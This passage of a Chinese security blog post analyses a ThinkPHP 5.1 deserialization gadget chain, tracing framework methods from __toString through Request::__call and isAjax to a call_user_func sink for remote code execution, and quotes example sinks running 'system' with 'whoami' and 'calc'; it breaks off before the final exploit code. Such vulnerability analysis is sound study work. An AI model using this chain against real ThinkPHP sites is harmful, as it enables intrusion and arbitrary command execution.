alt="在这里插入图片描述"></p><p><strong>这里我们选择 \thinkphp\library\think\model\concern\Conversion.php<br>Conversion类的第224行, 这里调用了一个toJson()方法。</strong></p><p>\thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;toJson();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>跟进toJson()方法</p><p>\thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>继续toArray()方法</p><p>thinkphp\library\think\model\concern\Conversion.php<br><img src="https://img-blog.csdnimg.cn/2020010615552628.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>目的</li></ul><p><strong>我们需要在toArray()函数中寻找一个满足<code>$可控变量-&gt;方法(参数可控)</code>的点</strong></p><ul><li>首先，这里调用了一个getRelation方法。</li><li>我们跟进getRelation()，<strong>它位于Attribute类中</strong></li></ul><p>thinkphp\library\think\model\concern\Conversion.php<br><img src="https://img-blog.csdnimg.cn/202001061559427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里调用了getRelation方法，跟入后得到代码：</p><p>thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">      &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于getRelation()下面的if语句为if (!$relation)，所以这里不用理会，返回空即可。</p><p><img src="https://img-blog.csdnimg.cn/20200106165650553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后调用了getAttr方法，我们跟进getAttr方法</p><p>thinkphp\library\think\model\concern\Conversion.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $notFound = <span class="keyword">false</span>;</span><br><span class="line">            $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = <span class="keyword">true</span>;</span><br><span class="line">            $value    = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">....</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">return</span> $value;</span><br></pre></td></tr></table></figure><p>继续跟进getData方法</p><p>thinkphp\library\think\model\concern\Attribute.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过查看getData函数我们可以知道 r e l a t i o n 的 值 为 relation的值为 relation的值为this-&gt;data[$name]，需要注意的一点是这里类的定义使用的是Trait而不是class。自<br>PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use<br>关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。</p></blockquote><p>我们可以在\thinkphp\library\think\Model.php中找到这样一个类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> <span class="keyword">implements</span> \<span class="title">JsonSerializable</span>, \<span class="title">ArrayAccess</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">RelationShip</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">ModelEvent</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">TimeStamp</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br></pre></td></tr></table></figure><p><strong>我们梳理一下目前我们需要控制的变量</strong></p><ul><li>$files位于类Windows</li><li>$append位于类Conversion</li><li>$data位于类Attribute</li></ul><p>引用大佬的图，简单的看一下，后面还有梳理<br><img src="https://img-blog.csdnimg.cn/20200106171421443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="代码执行点分析"><a href="#代码执行点分析" class="headerlink" title="代码执行点分析"></a>代码执行点分析</h2><p>这里的<code>$this-&gt;append</code>是我们<strong>可控</strong>的（在conversion中），然后通过<code>getRelation($key)</code>，但是下面有一个<code>!$relation</code>,所以我们只要置空即可</p><p>然后调用<code>getAttr($key)</code>,在调用<code>getData($name)</code>函数，这里<code>$this-&gt;data[&#39;name&#39;]</code>我们<strong>可控</strong>（在attribute中）</p><p><code>$relation</code> 变量来自 <code>$this-&gt;data[$name]</code><br><code>$name</code> 变量来自 <code>$this-&gt;append</code></p><p>之后回到toArray函数，通过这一句话<code>$relation-&gt;visible($name);</code> 我们控制<code>$relation</code>为一个类对象，调用不存在的visible方法，会自动调用<code>__call</code>方法，那么我们找到一个类对象没有visible方法</p><p>我们现在缺少一个进行代码执行的点，在这个类中需要没有visible方法。并且最好存在__call方法。</p><p>因为__call一般会存在__call_user_func和__call_user_func_array，php代码执行的终点经常选择这里。我们不止一次在Thinkphp的rce中见到这两个方法。</p><p><strong>可以在/thinkphp/library/think/Request.php，找到一个__call函数。__call 调用不可访问或不存在的方法时被调用。</strong></p><p>下面是引用大佬的图，很清晰的链条</p><p><img src="https://img-blog.csdnimg.cn/20200106171533384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>call_user_func_array(‘system’,array(‘whoami’));<br>call_user_func(‘system’,‘calc’);</p></blockquote><p>找到<br>/thinkphp/library/think/Request.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">           array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">           <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">   &#125;</span><br><span class="line">  .....</span><br></pre></td></tr></table></figure><p><code>$hook</code>这里是可控的，所以<code>call_user_func_array(array(任意类,任意方法),$args)</code> ，这样我们就可以调用任意类的任意方法了。，但是<code>array_unshift()</code>向数组插入新元素时会将新数组的值将被插入到数组的开头，<code>$args</code>第一个值不能够控制。这种情况下我们是构造不出可用的payload的。由于$args第一个值不能够控制，但是构造不出来参数可用的payload，因为第一个参数是$this对象</p><p><strong><code>call_user_func_array(array(任意类,任意方法),$args)</code> ，这样我们就可以调用任意类的任意方法了。</strong><br>虽然第330行用 array_unshift 函数把本类对象 $this 放在数组变量 $args 的第一个，但是我们可以寻找不受这个参数影响的方法</p><p>ThinkPHP 历史 RCE 漏洞的人可能知道， think\Request 类的 input 方法经常是，相当于 <code>call_user_func($filter,$data)</code> 。但是前面， <code>$args</code> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 input 方法，而应该寻找调用 input 的方法。</p><p><strong>最终产生rce的地方是在input函数当中</strong></p><p>在input函数中有一个 <code>$this-&gt;filterValue($data, $name, $filter);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">            $value = call_user_func($filter, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_scalar($value)) &#123;</span><br></pre></td></tr></table></figure><p>但是这里的$value不能自己进行控制，所以需要往上找可以控制value的地方,共发现以下函数:</p><ol><li>cookie</li><li>input 但是这里的input参数并不是可控的:</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span><span class="params">($data = [], $name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === $name) &#123;</span><br><span class="line">       <span class="comment">// 获取原始数据</span></span><br><span class="line">       <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = (string) $name;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">''</span> != $name) &#123;</span><br><span class="line">       <span class="comment">// 解析name</span></span><br><span class="line">       <span class="keyword">if</span> (strpos($name, <span class="string">'/'</span>)) &#123;</span><br><span class="line">         <span class="keyword">list</span>($name, $type) = explode(<span class="string">'/'</span>, $name);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (is_null($data)) &#123;</span><br><span class="line">         <span class="keyword">return</span> $default;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (is_object($data)) &#123;</span><br><span class="line">         <span class="keyword">return</span> $data;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析过滤器</span></span><br><span class="line">    $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">       array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">'filterValue'</span>], $filter);</span><br><span class="line">       <span class="keyword">if</span> (version_compare(PHP_VERSION, <span class="string">'7.1.0'</span>, <span class="string">'&lt;'</span>)) &#123;</span><br><span class="line">                <span class="comment">// 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;arrayReset($data);</span><br><span class="line">            &#125;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这里<code>$filter</code>可控，data参数不可控，而且<code>$name = (string) $name;</code>这里如果直接调用input的话，执行到这一句的时候会报错，直接退出，所以继续回溯，目的是要找到可以控制$name变量，使之最好是字符串。同时也要找到能控制data参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">       $filter = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">       <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">         $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filter[] = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $filter;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">         $data = $data[$val];</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们继续找一个调用input函数的地方。我们找到了param函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">       $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 自动获取请求变量</span></span><br><span class="line">       <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">          $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">          $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">default</span>:</span><br><span class="line">          $vars = [];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">       <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $name) &#123;</span><br><span class="line">       <span class="comment">// 获取包含文件上传信息的数组</span></span><br><span class="line">       $file = <span class="keyword">$this</span>-&gt;file();</span><br><span class="line">       $data = is_array($file) ? array_merge(<span class="keyword">$this</span>-&gt;param, $file) : <span class="keyword">$this</span>-&gt;param;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input($data, <span class="string">''</span>, $default, $filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里this-&gt;param完全可控，是通过get传参数进去的，那么也就是说input函数中的<code>$data</code>参数可控，也就是<code>call_user_func</code>的<code>$value,</code>现在差一个条件，那就是name是字符串，继续回溯。<br>这里仍然是不可控的，所以我们继续找调用param函数的地方。找到了isAjax函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isAjax</span><span class="params">($ajax = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $value  = <span class="keyword">$this</span>-&gt;server(<span class="string">'HTTP_X_REQUESTED_WITH'</span>);</span><br><span class="line">        $result = <span class="string">'xmlhttprequest'</span> == strtolower($value) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">true</span> === $ajax) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $result           = <span class="keyword">$this</span>-&gt;param(<span class="keyword">$this</span>-&gt;config[<span class="string">'var_ajax'</span>]) ? <span class="keyword">true</span> : $result;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mergeParam = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在isAjax函数中，我们可以控制<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，<code>$this-&gt;config[&#39;var_ajax&#39;]</code>可控就意味着param函数中的 n a m e 可 控 。 p a r a m 函 数 中 的 name可控。param函数中的 name可控。param函数中的name可控就意味着input函数中的$name可控。</p><p><strong>可以导致RCE<br>回溯一下</strong></p><p>param（）函数 可以获得<code>$_GET</code>数组并赋值给<code>$this-&gt;param</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span class="keyword">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="keyword">false</span>));</span><br></pre></td></tr></table></figure><p>array_merge（）数组合并起来<br>这句代码会将<code>$_GET</code>数组赋值到$this-&gt;param中，在往下执行就来到了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br></pre></td></tr></table></figure><p>再回到input函数中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;getData($data, $name);</span><br></pre></td></tr></table></figure><p><code>$name</code>的值来自于<code>$this-&gt;config[&#39;var_ajax&#39;]</code>，我们跟进getData函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">(array $data, $name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (explode(<span class="string">'.'</span>, $name) <span class="keyword">as</span> $val) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br><span class="line">\\</span><br></pre></td></tr></table></figure><p>这里<code>$data</code>直接等于 <code>$data</code> = <code>$data[$val]</code> = <code>$data[$name]</code></p><p>然后就是解析过滤器，跟进getFilter函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getFilter</span><span class="params">($filter, $default)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null($filter)) &#123;</span><br><span class="line">            $filter = [];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $filter = $filter ?: <span class="keyword">$this</span>-&gt;filter;</span><br><span class="line">            <span class="keyword">if</span> (is_string($filter) &amp;&amp; <span class="keyword">false</span> === strpos($filter, <span class="string">'/'</span>)) &#123;</span><br><span class="line">                $filter = explode(<span class="string">','</span>, $filter);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $filter = (<span class="keyword">array</span>) $filter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $filter[] = $default;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $filter;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020010714350552.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>就是$filter可控<br>最后回到input函数 关键代码</p><p><img src="https://img-blog.csdnimg.cn/20200107143733892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后导致RCE的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span 